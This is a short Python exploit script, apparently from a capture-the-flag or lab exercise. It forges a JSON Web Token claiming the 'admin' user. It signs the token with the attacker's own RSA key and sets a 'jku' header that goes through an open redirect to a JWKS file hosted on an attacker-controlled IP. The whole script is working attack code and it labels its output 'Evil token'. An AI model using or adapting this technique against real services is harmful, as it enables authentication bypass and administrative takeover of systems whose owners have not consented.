from jwcrypto import jwk, jwt
import json

with open("keypair.pem","rb") as pemfile:
    key = jwk.JWK.from_pem(pemfile.read())

publickey = key.export(private_key=False)
print("jwks.json content:",json.loads(publickey))
print()


with open("jwks.json", "w") as h:
    h.write(json.dumps(json.loads(publickey)))


T = jwt.JWT(header={"alg":"RS256",
                    "kid":key["kid"],
                    "typ":"jwt",
                    "jku":"http://34.133.45.223/?redirect_uri=http://159.89.161.87:8080/jwks.json"
                    },
            claims={"user":"admin"})
T.make_signed_token(key)
print("Evil token:",T.serialize())
